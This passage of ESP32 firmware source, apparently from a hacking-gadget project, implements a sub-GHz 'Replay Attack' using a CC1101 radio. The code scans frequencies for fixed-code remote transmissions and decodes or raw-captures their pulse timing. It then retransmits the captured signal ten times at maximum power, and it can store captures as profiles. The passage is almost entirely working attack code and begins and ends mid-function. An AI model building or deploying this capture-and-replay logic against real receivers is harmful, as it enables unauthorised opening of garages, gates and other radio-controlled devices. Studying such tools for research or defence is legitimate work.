                       rawCaptureItems[1].duration0, rawCaptureItems[1].duration1,
                       rawCaptureItems[2].duration0, rawCaptureItems[2].duration1);
        }

        // Freq + replay hint
        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
        tft.setCursor(panelX + 8, panelY + 48);
        tft.printf("%.3f MHz", frequencyList[currentFreqIndex] / 1000000.0);
        tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
        tft.setCursor(panelX + SCALE_X(105), panelY + 48);
        tft.print("TAP \xF7 REPLAY");
    } else {
        // Protocol-decoded display
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.setCursor(panelX + SCALE_X(35), panelY + 6);
        tft.print(">> CAPTURED <<");

        tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
        tft.setCursor(panelX + 8, panelY + 20);
        tft.print(capturedValue);

        // P/B/Freq line
        tft.setCursor(panelX + 8, panelY + 35);
        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
        tft.print("P:");
        tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
        tft.print(capturedProtocol);
        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
        tft.print(" B:");
        tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
        tft.print(capturedBitLength);
        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
        tft.print(" ");
        tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
        float freq = autoScanEnabled ? frequencyList[autoScanIndex] / 1000000.0 : frequencyList[currentFreqIndex] / 1000000.0;
        tft.print(freq, 3);

        // Replay hint
        tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
        tft.setCursor(panelX + SCALE_X(55), panelY + 50);
        tft.print("TAP \xF7 REPLAY");
    }

    // Reset waterfall epoch — capture panel just appeared, clear transition zone
    epoch_sub = 0;
}

// ═══════════════════════════════════════════════════════════════════════════
// RMT DRIVER
// ═══════════════════════════════════════════════════════════════════════════

bool initRMT() {
    if (rmtInitialized) return true;

    rmt_config_t config = RMT_DEFAULT_CONFIG_TX((gpio_num_t)CC1101_GDO0, RMT_CHANNEL_0);
    config.clk_div = 80;  // 1μs resolution (80MHz / 80 = 1MHz)
    config.tx_config.idle_level = RMT_IDLE_LEVEL_LOW;
    config.tx_config.idle_output_en = true;

    esp_err_t err = rmt_config(&config);
    if (err != ESP_OK) {
        #if CYD_DEBUG
        Serial.println("[RMT] Config failed: " + String(err));
        #endif
        return false;
    }

    err = rmt_driver_install(RMT_CHANNEL_0, 0, 0);
    if (err != ESP_OK) {
        #if CYD_DEBUG
        Serial.println("[RMT] Driver install failed: " + String(err));
        #endif
        return false;
    }

    rmtInitialized = true;
    #if CYD_DEBUG
    Serial.println("[RMT] Initialized on GPIO " + String(CC1101_GDO0));
    #endif
    return true;
}

bool isRMTInitialized() {
    return rmtInitialized;
}

void rmtTransmit(rmt_item32_t* items, size_t numItems) {
    if (!rmtInitialized) return;
    rmt_write_items(RMT_CHANNEL_0, items, numItems, true);
    rmt_wait_tx_done(RMT_CHANNEL_0, portMAX_DELAY);
}

static int buildRMTSymbols(int protocol, unsigned long value, int bitLength) {
    if (protocol < 1 || protocol >= NUM_RC_PROTOCOLS) {
        return 0;
    }

    const RCProtocol& proto = rcProtocols[protocol];
    uint8_t highLevel = proto.inverted ? 0 : 1;
    uint8_t lowLevel = proto.inverted ? 1 : 0;

    int idx = 0;

    // Data bits (MSB first)
    for (int i = bitLength - 1; i >= 0 && idx < RMT_MAX_SYMBOLS - 1; i--) {
        if ((value >> i) & 1) {
            // One bit
            rmtSymbols[idx].level0 = highLevel;
            rmtSymbols[idx].duration0 = proto.pulseLength * proto.oneHigh;
            rmtSymbols[idx].level1 = lowLevel;
            rmtSymbols[idx].duration1 = proto.pulseLength * proto.oneLow;
        } else {
            // Zero bit
            rmtSymbols[idx].level0 = highLevel;
            rmtSymbols[idx].duration0 = proto.pulseLength * proto.zeroHigh;
            rmtSymbols[idx].level1 = lowLevel;
            rmtSymbols[idx].duration1 = proto.pulseLength * proto.zeroLow;
        }
        idx++;
    }

    // Sync pulse after data
    rmtSymbols[idx].level0 = highLevel;
    rmtSymbols[idx].duration0 = proto.pulseLength * proto.syncHigh;
    rmtSymbols[idx].level1 = lowLevel;
    rmtSymbols[idx].duration1 = proto.pulseLength * proto.syncLow;
    idx++;

    return idx;
}

// ═══════════════════════════════════════════════════════════════════════════
// RMT RX SIGNAL DECODING (replaces RCSwitch interrupt-based detection)
// ═══════════════════════════════════════════════════════════════════════════

// Check if raw frame has consistent pulse timing (real signal vs noise)
// Real signals: most HIGH pulses cluster around 1-3 distinct durations
// Noise: random durations spread across the full range
static bool checkPulseConsistency(rmt_item32_t* items, size_t count) {
    if (count < 20) return false;

    // Collect first 20 HIGH durations
    uint32_t highs[20];
    int n = 0;
    for (int i = 0; i < 20 && i < (int)count; i++) {
        if (items[i].duration0 > 0) {
            highs[n++] = items[i].duration0;
        }
    }
    if (n < 10) return false;

    // Sort to find median (simple insertion sort — only 20 elements)
    for (int i = 1; i < n; i++) {
        uint32_t key = highs[i];
        int j = i - 1;
        while (j >= 0 && highs[j] > key) { highs[j + 1] = highs[j]; j--; }
        highs[j + 1] = key;
    }

    uint32_t median = highs[n / 2];
    if (median == 0) return false;
    uint32_t tolerance = median * 40 / 100;

    int matching = 0;
    for (int i = 0; i < n; i++) {
        if (highs[i] >= median - tolerance && highs[i] <= median + tolerance) {
            matching++;
        }
    }

    // At least 50% of pulses must cluster near median for a real signal
    return (matching * 100 / n) >= 50;
}

// Check if pulse duration is within tolerance of target
// 40% tolerance — tighter than RCSwitch's 60% because we lack sync pulse validation
// Without sync detection, loose tolerance lets noise match as data bits
static bool pulseMatch(uint32_t duration, uint32_t target, uint8_t tolerance = 40) {
    uint32_t tol = (target * tolerance) / 100;
    return (duration >= (target - tol) && duration <= (target + tol));
}

// Decode RMT items into signal value, returns true if valid signal found
// Does NOT require sync pulse — decodes consecutive data bits directly
// With 5ms idle threshold, sync gets split so we can't rely on finding it
// Instead: try each protocol, try decoding from each start position as data bits
static bool decodeRmtSignal(rmt_item32_t* items, size_t itemCount,
                            unsigned long* outValue, int* outBitLength, int* outProtocol) {
    if (itemCount < 8) return false;

    // Try each protocol
    for (int proto = 1; proto < NUM_RC_PROTOCOLS; proto++) {
        const RCProtocol& p = rcProtocols[proto];
        if (p.pulseLength == 0) continue;

        uint32_t expZeroHigh = p.pulseLength * p.zeroHigh;
        uint32_t expZeroLow  = p.pulseLength * p.zeroLow;
        uint32_t expOneHigh  = p.pulseLength * p.oneHigh;
        uint32_t expOneLow   = p.pulseLength * p.oneLow;

        // Try a few start positions (noise at start of frame)
        size_t maxStart = (itemCount > 16) ? 8 : 2;
        for (size_t start = 0; start < maxStart && start < itemCount - 7; start++) {
            unsigned long value = 0;
            int bitCount = 0;

            for (size_t j = start; j < itemCount && bitCount < 32; j++) {
                uint32_t h = items[j].duration0;
                uint32_t l = items[j].duration1;

                // Stop at very long LOW (sync/gap/idle remnant)
                if (l > p.pulseLength * 10) break;
                // Stop at zero-duration (end-of-frame marker)
                if (h == 0 && l == 0) break;

                bool isZero, isOne;
                if (!p.inverted) {
                    isZero = pulseMatch(h, expZeroHigh) && pulseMatch(l, expZeroLow);
                    isOne  = pulseMatch(h, expOneHigh)  && pulseMatch(l, expOneLow);
                } else {
                    isZero = pulseMatch(l, expZeroHigh) && pulseMatch(h, expZeroLow);
                    isOne  = pulseMatch(l, expOneHigh)  && pulseMatch(h, expOneLow);
                }

                if (isZero) {
                    value = (value << 1) | 0;
                    bitCount++;
                } else if (isOne) {
                    value = (value << 1) | 1;
                    bitCount++;
                } else {
                    break;  // Unknown bit pattern, stop
                }
            }

            // Valid if we got enough consecutive bits
            // 12 minimum (was 8) — reduces noise false positives without missing real remotes
            // Most remotes send 20-24 bits; shortest real protocol is 12 bits
            if (bitCount >= 12 && value != 0) {
                *outValue = value;
                *outBitLength = bitCount;
                *outProtocol = proto;
                return true;
            }
        }
    }

    return false;
}

// ═══════════════════════════════════════════════════════════════════════════
// PUBLIC FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    if (initialized) return;

    // Heap-allocate FFT k-value buffer (saves DRAM .bss for 3.5" CYD)
    if (!fftKValues) {
        fftKValues = (volatile int*)calloc(FFT_LINE_WIDTH, sizeof(int));
    }

    #if CYD_DEBUG
    Serial.println("[SUBGHZ] Initializing Replay Attack...");
    #endif

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawReplayUI();  // Icon bar instead of title bar

    // Deselect other SPI devices so they don't interfere
    pinMode(NRF24_CSN, OUTPUT);
    digitalWrite(NRF24_CSN, HIGH);  // Deselect NRF24 (GPIO4)
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);       // Deselect SD (GPIO5)

    // Reset SPI bus so ELECHOUSE can configure fresh (same pattern as working NRF24)
    SPI.end();
    delay(5);

    // Safe check — ELECHOUSE has blocking MISO loops that freeze with no CC1101
    if (!cc1101SafeCheck()) {
        #if CYD_DEBUG
        Serial.println("[REPLAY] CC1101 not detected (safe check)");
        #endif
        return;
    }

    // Configure CC1101 SPI and GDO pins
    ELECHOUSE_cc1101.setSpiPin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, CC1101_CS);
    ELECHOUSE_cc1101.setGDO(CC1101_GDO0, CC1101_GDO2);

    // Initialize CC1101
    if (ELECHOUSE_cc1101.getCC1101()) {
        ELECHOUSE_cc1101.Init();
        ELECHOUSE_cc1101.setCCMode(0);       // Raw/async serial mode
        ELECHOUSE_cc1101.setModulation(2);   // ASK/OOK modulation
        ELECHOUSE_cc1101.setRxBW(270);       // 270kHz RX bandwidth (Flipper Zero OOK preset)
        ELECHOUSE_cc1101.setDRate(3.79);     // 3.794 kBaud (Flipper Zero OOK preset)
        // CRITICAL: OOK async mode — no sync word, no carrier sense
        // setCCMode(0) leaves MDMCFG2=0x32 (16/16 sync mode) — CC1101 waits for sync word that OOK remotes don't send
        // 0x30 = ASK/OOK + no sync + no carrier sense: GDO0 outputs continuous demodulated data
        // RCSwitch's protocol matching handles noise rejection — it only accepts valid protocol timing
        ELECHOUSE_cc1101.SpiWriteReg(0x12, 0x30);  // MDMCFG2: OOK, no sync, no carrier sense
        // Flipper Zero AGC settings for OOK 270kHz
        ELECHOUSE_cc1101.SpiWriteReg(0x1B, 0x03);  // AGCCTRL2: MAGN_TARGET 33dB
        ELECHOUSE_cc1101.SpiWriteReg(0x1C, 0x00);  // AGCCTRL1: LNA2 decreased first
        ELECHOUSE_cc1101.SpiWriteReg(0x1D, 0x40);  // AGCCTRL0: Low hysteresis, 8 samples
        ELECHOUSE_cc1101.SpiWriteReg(0x21, 0xB6);  // FREND1: RX frontend config
        ELECHOUSE_cc1101.SpiWriteReg(0x22, 0x11);  // FREND0: PA from PATABLE[1] for OOK
        // Confirm IOCFG0 — setCCMode(0) sets it to 0x0D, verify not overwritten by setModulation
        ELECHOUSE_cc1101.SpiWriteReg(0x02, 0x0D);  // IOCFG0: async serial data on GDO0
        ELECHOUSE_cc1101.setMHZ(frequencyList[currentFreqIndex] / 1000000.0);
        cc1101PaSetRx();

        #if CYD_DEBUG
        Serial.println("[SUBGHZ] CC1101 initialized on SPI18/19/23 CS27 GDO0=22 GDO2=35");
        #endif
    } else {
        #if CYD_DEBUG
        Serial.println("[SUBGHZ] CC1101 not found! Check wiring.");
        #endif
        tft.setTextColor(TFT_RED);
        tft.setCursor(10, 100);
        tft.print("ERROR: CC1101 not found!");
        tft.setCursor(10, 115);
        tft.print("Check SPI wiring!");
        delay(2000);
    }

    // RMT RX will be started after UI draws — see initRmtRx() call below
    // RMT TX is still used for signal transmission (initRMT() on demand)
    rmtRxInitialized = false;
    rmtRxRingBuf = NULL;

    // Load profile count from EEPROM
    EEPROM.begin(EEPROM_SIZE);
    profileCount = EEPROM.read(EEPROM_PROFILE_COUNT_ADDR);
    if (profileCount > MAX_PROFILES || profileCount < 0) {
        profileCount = 0;
    }
    EEPROM.end();

    // Reset state
    signalCaptured = false;
    capturedValue = 0;
    capturedBitLength = 0;
    capturedProtocol = 0;
    autoScanEnabled = true;   // Scan-first workflow — starts scanning immediately
    autoScanIndex = 0;
    autoScanLastChange = millis();
    exitRequested = false;
    transmitting = false;
    statusBlink = false;

    // Initialize FFT waterfall
    initPalette();
    epoch_sub = 0;
    attenuation_sub = 10;
    fftFrameReady = false;
    fftTaskHandle = NULL;
    fftTaskRunning = false;

    drawUI();
    updateDisplay();

    // CC1101 register readback — verify config survived Init/setCCMode/setModulation chain
    {
        uint8_t iocfg0 = ELECHOUSE_cc1101.SpiReadReg(0x02);
        uint8_t pktctrl0 = ELECHOUSE_cc1101.SpiReadReg(0x08);
        uint8_t mdmcfg2 = ELECHOUSE_cc1101.SpiReadReg(0x12);
        uint8_t marcstate = ELECHOUSE_cc1101.SpiReadStatus(0x35) & 0x1F;
        Serial.printf("[DIAG] IOCFG0=0x%02X PKTCTRL0=0x%02X MDMCFG2=0x%02X MARC=0x%02X (%s)\n",
                      iocfg0, pktctrl0, mdmcfg2, marcstate,
                      marcstate == 0x0D ? "RX" : "NOT_RX");

        // Quick GDO0 edge count — OOK noise should toggle GDO0 even without a remote
        pinMode(CC1101_GDO0, INPUT);
        int edges = 0, lastSt = digitalRead(CC1101_GDO0);
        unsigned long t0 = millis();
        while (millis() - t0 < 200) {
            int st = digitalRead(CC1101_GDO0);
            if (st != lastSt) { edges++; lastSt = st; }
        }
        Serial.printf("[DIAG] GDO0(GPIO%d) edges/200ms=%d %s\n",
                      CC1101_GDO0, edges, edges > 10 ? "ACTIVE" : "STUCK!");
    }

    // Start RMT RX on GDO0 — hardware pulse capture at 1μs resolution
    // Replaces RCSwitch interrupt which wasn't triggering on ESP32 GPIO22
    // decodeRmtSignal() in main loop handles protocol matching (same 12 protocols)
    initRmtRx();

    initialized = true;

    // Launch Core 0 FFT sampling task
    startFFTTask();

    #if CYD_DEBUG
    Serial.printf("[SUBGHZ] Ready on %.3f MHz (FFT on Core 0)\n", frequencyList[currentFreqIndex] / 1000000.0);
    #endif
}

void loop() {
    if (!initialized) return;

    // Heartbeat debug — shows PA module state, RSSI, and GDO0 pin for diagnosing capture issues
    static unsigned long lastHB = 0;
    if (millis() - lastHB > 2000) {
        int rssi = -999;
        if (cc1101Lock(pdMS_TO_TICKS(10))) {
            rssi = ELECHOUSE_cc1101.getRssi();
            cc1101Unlock();
        }
        Serial.printf("[HB] PA=%d RSSI=%d freq=%.3f rmtRx=%d captured=%d\n",
            (int)cc1101_pa_module, rssi,
            frequencyList[currentFreqIndex] / 1000000.0,
            (int)rmtRxInitialized, (int)signalCaptured);
        lastHB = millis();
    }

    // Icon bar — checked BEFORE touchButtonsUpdate() because on 3.5" CYD the
    // BTN_BACK zone (X213-320 Y0-80) overlaps Replay/Save icon positions.
    static unsigned long lastIconTap = 0;
    if (millis() - lastIconTap > 200) {
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
                for (int i = 0; i < RA_ICON_NUM; i++) {
                    int hitLeft = raIconX[i] - 5;
                    int hitRight = raIconX[i] + RA_ICON_SIZE + 5;
                    if ((int)tx >= hitLeft && (int)tx < hitRight) {
                        lastIconTap = millis();
                        switch (i) {
                            case 0: // BACK
                                exitRequested = true;
                                return;
                            case 1: // SCAN toggle
                                toggleAutoScan();
                                updateDisplay();
                                return;
                            case 2: // CLEAR signal when captured, otherwise Prev freq
                                if (signalCaptured) {
                                    clearSignal();
                                    tft.fillRect(0, CAPTURE_PANEL_Y, SCREEN_WIDTH, CAPTURE_PANEL_H, HALEHOUND_BLACK);
                                    resumeRmtRx();
                                    epoch_sub = 0;
                                    updateDisplay();
                                    Serial.println("[REPLAY] Signal cleared");
                                } else if (!autoScanEnabled) {
                                    prevFrequency(); updateDisplay();
                                }
                                return;
                            case 3: // Next freq (only when scan OFF)
                                if (!autoScanEnabled) { nextFrequency(); updateDisplay(); }
                                return;
                            case 4: // REPLAY signal
                                if (signalCaptured) {
                                    sendSignal();
                                } else {
                                    tft.fillRect(SCALE_X(30), CAPTURE_PANEL_Y, SCALE_W(180), SCALE_H(25), HALEHOUND_HOTPINK);
                                    tft.setTextColor(HALEHOUND_BLACK);
                                    tft.setCursor(SCALE_X(35), CAPTURE_PANEL_Y + 6);
                                    tft.print("NO SIGNAL CAPTURED");
                                    delay(500);
                                    updateDisplay();
                                }
                                return;
                            case 5: // SAVE / Profiles
                                showProfileMenu();
                                return;
                        }
                    }
                }
            }
        }
    }

    // Update touch buttons (AFTER icon bar — only runs if no icon was tapped)
    touchButtonsUpdate();

    // Handle frequency change (LEFT/RIGHT)
    if (buttonPressed(BTN_LEFT)) {
        if (!autoScanEnabled) {
            prevFrequency();
            updateDisplay();
        }
    }

    if (buttonPressed(BTN_RIGHT)) {
        if (!autoScanEnabled) {
            nextFrequency();
            updateDisplay();
        }
    }

    // Toggle auto-scan (UP)
    if (buttonPressed(BTN_UP)) {
        toggleAutoScan();
        updateDisplay();
    }

    // Send signal (SELECT)
    if (buttonPressed(BTN_SELECT)) {
        if (signalCaptured) {
            sendSignal();
        }
    }

    // Exit (BACK or BOOT)
    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        exitRequested = true;
        return;
    }

    // Auto-scan logic
    if (autoScanEnabled) {
        unsigned long now = millis();

        if (autoScanPaused) {
            // Check if pause time expired
            if (now - autoScanPauseTime >= AUTO_SCAN_PAUSE_MS) {
                autoScanPaused = false;
                autoScanLastChange = now;
            }
        } else {
            // Check if dwell time expired
            if (now - autoScanLastChange >= AUTO_SCAN_DWELL_MS) {
                // Move to next frequency
                autoScanIndex = (autoScanIndex + 1) % frequencyCount;
                autoScanLastChange = now;

                // Tune CC1101 (mutex protects from Core 0 FFT sampling)
                if (cc1101Lock(pdMS_TO_TICKS(60))) {
                    cc1101PaSetIdle();
                    ELECHOUSE_cc1101.setMHZ(frequencyList[autoScanIndex] / 1000000.0);
                    cc1101PaSetRx();
                    cc1101Unlock();
                }

                updateDisplay();
            }

            // Check RSSI for signal
            if (cc1101Lock(pdMS_TO_TICKS(10))) {
                int rssi = ELECHOUSE_cc1101.getRssi();
                cc1101Unlock();
                if (rssi > AUTO_SCAN_RSSI_THRESHOLD) {
                    autoScanPaused = true;
                    autoScanPauseTime = now;
                    updateDisplay();
                }
            }
        }
    }

    // Check for received signal via RMT hardware capture (1μs pulse resolution)
    // DRAIN LOOP: Process ALL pending frames to prevent RMT RX BUFFER FULL errors
    // OOK noise floods the ring buffer — must drain fast and discard noise frames
    // Only accept signals that pass: RSSI gate + repeat validation (protocol) or
    // RSSI gate + pulse consistency (raw)
    static uint32_t rmtFrameCount = 0;
    static uint32_t rmtDecodeHits = 0;
    if (rmtRxRingBuf) {
        // Read RSSI once per drain cycle for quality gating
        int currentRssi = -999;
        if (!signalCaptured && cc1101Lock(pdMS_TO_TICKS(5))) {
            currentRssi = ELECHOUSE_cc1101.getRssi();
            cc1101Unlock();
        }

        size_t rxSize = 0;
        rmt_item32_t* items;
        int drainCount = 0;
        const int MAX_DRAIN = 30;  // Cap per loop() to avoid starving UI/touch

        while (drainCount < MAX_DRAIN &&
               (items = (rmt_item32_t*)xRingbufferReceive(rmtRxRingBuf, &rxSize, 0)) != NULL) {
            drainCount++;
            size_t numItems = rxSize / sizeof(rmt_item32_t);
            rmtFrameCount++;

            // Fast discard: tiny frames or weak RSSI = noise, skip immediately
            if (numItems < 8 || signalCaptured || currentRssi < CAPTURE_RSSI_THRESHOLD) {
                vRingbufferReturnItem(rmtRxRingBuf, (void*)items);
                continue;
            }

            // Try protocol decode
            unsigned long val = 0;
            int bits = 0, proto = 0;
            if (decodeRmtSignal(items, numItems, &val, &bits, &proto) && val != 0) {
                // Repeat validation — must see same value+protocol twice
                // Real remotes send 3-5 repetitions; noise never decodes the same way twice
                if (val == pendingValue && proto == pendingProto) {
                    // CONFIRMED — same decode seen twice
                    rmtDecodeHits++;
                    capturedValue = val;
                    capturedBitLength = bits;
                    capturedProtocol = proto;
                    signalCaptured = true;
                    pendingValue = 0;
                    pendingProto = 0;
                    pendingTime = 0;

                    Serial.printf("[RMT-DECODE] CONFIRMED val=%lu bits=%d proto=%d freq=%.3fMHz rssi=%d\n",
                                  val, bits, proto, frequencyList[currentFreqIndex] / 1000000.0, currentRssi);

                    if (autoScanEnabled) {
                        currentFreqIndex = autoScanIndex;
                    }
                    drawSignalCaptured();
                    vRingbufferReturnItem(rmtRxRingBuf, (void*)items);
                    break;  // Got confirmed signal, stop draining
                } else {
                    // First match — store as pending, wait for repeat confirmation
                    pendingValue = val;
                    pendingBits = bits;
                    pendingProto = proto;
                    pendingTime = millis();
                    Serial.printf("[RMT-PENDING] val=%lu bits=%d proto=%d (awaiting repeat)\n",
                                  val, bits, proto);
                }
            }
            // Raw capture fallback — needs STRONG RSSI + pulse consistency check
            else if (numItems >= 30 && !signalCaptured && currentRssi > RAW_RSSI_THRESHOLD) {
                if (checkPulseConsistency(items, numItems)) {
                    int copyLen = ((int)numItems > RAW_CAPTURE_MAX) ? RAW_CAPTURE_MAX : (int)numItems;
                    memcpy(rawCaptureItems, items, copyLen * sizeof(rmt_item32_t));
                    rawCaptureLen = copyLen;
                    isRawCapture = true;
                    signalCaptured = true;
                    capturedValue = 0;
                    capturedBitLength = copyLen;
                    capturedProtocol = 0;

                    Serial.printf("[RAW-CAPTURE] %d items at %.3fMHz rssi=%d (consistency OK)\n",
                                  copyLen, frequencyList[currentFreqIndex] / 1000000.0, currentRssi);

                    if (autoScanEnabled) {
                        currentFreqIndex = autoScanIndex;
                    }
                    drawSignalCaptured();
                    vRingbufferReturnItem(rmtRxRingBuf, (void*)items);
                    break;
                }
            }
            vRingbufferReturnItem(rmtRxRingBuf, (void*)items);
        }

        // Expire unconfirmed pending decode after timeout
        if (pendingValue != 0 && millis() - pendingTime > PENDING_EXPIRE_MS) {
            pendingValue = 0;
            pendingProto = 0;
            pendingTime = 0;
        }
    }

    // FFT waterfall — Core 0 samples + computes, Core 1 draws
    drawWaterfallLine();
}

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    // Stop Core 0 FFT task first
    exitRequested = true;
    stopFFTTask();

    // Stop RMT RX
    if (rmtRxInitialized) {
        rmt_rx_stop(RMT_RX_CHANNEL);
        rmt_driver_uninstall(RMT_RX_CHANNEL);
        rmtRxInitialized = false;
        rmtRxRingBuf = NULL;
    }

    // Stop RMT TX
    if (rmtInitialized) {
        rmt_driver_uninstall(RMT_CHANNEL_0);
        rmtInitialized = false;
    }

    cc1101PaSetIdle();
    spiDeselect();

    // Clean up mutex
    if (cc1101Mtx) {
        vSemaphoreDelete(cc1101Mtx);
        cc1101Mtx = NULL;
    }

    initialized = false;
    exitRequested = false;
    fftFrameReady = false;
    if (fftKValues) { free((void*)fftKValues); fftKValues = nullptr; }

    #if CYD_DEBUG
    Serial.println("[SUBGHZ] Cleanup complete");
    #endif
}

// ═══════════════════════════════════════════════════════════════════════════
// FREQUENCY CONTROL
// ═══════════════════════════════════════════════════════════════════════════

int getFrequencyCount() {
    return frequencyCount;
}

uint32_t getFrequency(int index) {
    if (index < 0 || index >= frequencyCount) return 0;
    return frequencyList[index];
}

float getFrequencyMHz(int index) {
    return getFrequency(index) / 1000000.0;
}

void setFrequencyIndex(int index) {
    if (index < 0) index = frequencyCount - 1;
    if (index >= frequencyCount) index = 0;
    currentFreqIndex = index;

    if (cc1101Lock(pdMS_TO_TICKS(60))) {
        cc1101PaSetIdle();
        ELECHOUSE_cc1101.setMHZ(frequencyList[currentFreqIndex] / 1000000.0);
        cc1101PaSetRx();
        cc1101Unlock();
    }

    #if CYD_DEBUG
    Serial.println("[SUBGHZ] Frequency: " + String(frequencyList[currentFreqIndex] / 1000000.0, 3) + " MHz");
    #endif
}

int getFrequencyIndex() {
    return currentFreqIndex;
}

uint32_t getCurrentFrequency() {
    return frequencyList[currentFreqIndex];
}

float getCurrentFrequencyMHz() {
    return frequencyList[currentFreqIndex] / 1000000.0;
}

void nextFrequency() {
    setFrequencyIndex(currentFreqIndex + 1);
}

void prevFrequency() {
    setFrequencyIndex(currentFreqIndex - 1);
}

// ═══════════════════════════════════════════════════════════════════════════
// AUTO-SCAN
// ═══════════════════════════════════════════════════════════════════════════

void setAutoScan(bool enabled) {
    autoScanEnabled = enabled;
    if (enabled) {
        autoScanIndex = 0;
        autoScanLastChange = millis();
        autoScanPaused = false;
        #if CYD_DEBUG
        Serial.println("[SUBGHZ] Auto-scan ENABLED");
        #endif
    } else {
        #if CYD_DEBUG
        Serial.println("[SUBGHZ] Auto-scan DISABLED");
        #endif
    }
}

void toggleAutoScan() {
    setAutoScan(!autoScanEnabled);
}

bool isAutoScanEnabled() {
    return autoScanEnabled;
}

bool isAutoScanPaused() {
    return autoScanPaused;
}

// ═══════════════════════════════════════════════════════════════════════════
// SIGNAL CAPTURE
// ═══════════════════════════════════════════════════════════════════════════

bool hasSignal() {
    return signalCaptured;
}

unsigned long getCapturedValue() {
    return capturedValue;
}

int getCapturedBitLength() {
    return capturedBitLength;
}

int getCapturedProtocol() {
    return capturedProtocol;
}

int getRSSI() {
    return ELECHOUSE_cc1101.getRssi();
}

void clearSignal() {
    signalCaptured = false;
    capturedValue = 0;
    capturedBitLength = 0;
    capturedProtocol = 0;
    isRawCapture = false;
    rawCaptureLen = 0;
    // Reset repeat validation state so noise doesn't carry over
    pendingValue = 0;
    pendingProto = 0;
    pendingBits = 0;
    pendingTime = 0;
}

// ═══════════════════════════════════════════════════════════════════════════
// SIGNAL TRANSMISSION
// ═══════════════════════════════════════════════════════════════════════════

// Raw replay — sends exact captured pulse timing via RMT TX hardware
// Works with ANY fixed-code remote regardless of encoding scheme
static void sendRawSignal() {
    if (rawCaptureLen == 0) {
        Serial.println("[SUBGHZ-TX] No raw signal to send");
        return;
    }

    Serial.printf("[SUBGHZ-TX] RAW START: %d items freq=%.3fMHz\n",
                  rawCaptureLen, frequencyList[currentFreqIndex] / 1000000.0);

    // Set transmitting flag + refresh icon bar
    transmitting = true;
    drawReplayUI();
    drawHeader();

    // Visual feedback IMMEDIATELY
    tft.fillRect(0, CAPTURE_PANEL_Y, SCREEN_WIDTH, CAPTURE_PANEL_H, HALEHOUND_BLACK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(10, CAPTURE_PANEL_Y + 10);
    tft.print("RAW TRANSMITTING...");
    tft.setCursor(10, CAPTURE_PANEL_Y + 26);
    tft.setTextColor(HALEHOUND_BRIGHT);
    tft.printf("%d items x10 reps", rawCaptureLen);

    // Pause RMT RX — TX needs GDO0 as output
    pauseRmtRx();
    delay(20);

    // Acquire CC1101 mutex
    bool gotLock = cc1101Lock(pdMS_TO_TICKS(300));
    Serial.printf("[SUBGHZ-TX] RAW Lock: %s\n", gotLock ? "OK" : "FAIL");

    if (!gotLock) {
        tft.setCursor(10, CAPTURE_PANEL_Y + 30);
        tft.setTextColor(0xF800);
        tft.print("LOCK FAILED!");
        delay(500);
        transmitting = false;
        resumeRmtRx();
        updateDisplay();
        return;
    }

    // Switch CC1101 to TX mode at max power
    ELECHOUSE_cc1101.setPA(12);
    cc1101PaSetTx();
    delay(5);  // Let PA settle after RX->TX switch

    // Init RMT TX on GDO0 (same pin as RX, but now output)
    if (!rmtInitialized) {
        initRMT();
    }

    if (rmtInitialized) {
        // Send raw capture 10 times with 10ms inter-frame gaps
        // Most receivers need 2-5 repetitions to latch, 10 gives solid margin
        for (int rep = 0; rep < 10; rep++) {
            rmtTransmit(rawCaptureItems, rawCaptureLen);
            delay(10);
            yield();
        }
        Serial.printf("[SUBGHZ-TX] RAW sent %d items x 10 reps\n", rawCaptureLen);
    } else {
        Serial.println("[SUBGHZ-TX] RAW RMT init failed!");
        tft.setCursor(10, CAPTURE_PANEL_Y + 40);
        tft.setTextColor(0xF800);
        tft.print("RMT INIT FAILED!");
    }

    // Switch back to RX (still holding lock)
    cc1101PaSetRx();
    cc1101Unlock();

    tft.fillRect(0, CAPTURE_PANEL_Y, SCREEN_WIDTH, CAPTURE_PANEL_H, HALEHOUND_BLACK);
    tft.setTextColor(HALEHOUND_GREEN);
    tft.setCursor(10, CAPTURE_PANEL_Y + 15);
    tft.print("RAW TX COMPLETE");
    delay(600);

    // Restore receive chain + full screen rebuild
    transmitting = false;
    resumeRmtRx();

    drawHeaderStatic();
    updateDisplay();
    if (signalCaptured) drawSignalCaptured();

    Serial.println("[SUBGHZ-TX] RAW DONE");
}

void sendSignal() {
    if (isRawCapture && rawCaptureLen > 0) {
        sendRawSignal();
    } else {
        sendSignal(capturedValue, capturedBitLength, capturedProtocol);
    }
}

void sendSignal(unsigned long value, int bitLength, int protocol) {
    if (value == 0 || bitLength == 0 || protocol == 0) {
        Serial.println("[SUBGHZ-TX] No signal to send");
        return;
    }

    Serial.printf("[SUBGHZ-TX] START: val=%lu bits=%d proto=%d freq=%.3fMHz\n",
                  value, bitLength, protocol, frequencyList[currentFreqIndex] / 1000000.0);

    // Set transmitting flag + refresh icon bar
    transmitting = true;
    drawReplayUI();
    drawHeader();

    // Visual feedback IMMEDIATELY so Jesse knows the button worked
    tft.fillRect(0, CAPTURE_PANEL_Y, SCREEN_WIDTH, CAPTURE_PANEL_H, HALEHOUND_BLACK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(10, CAPTURE_PANEL_Y + 10);
    tft.print("TRANSMITTING...");
    tft.setCursor(10, CAPTURE_PANEL_Y + 26);
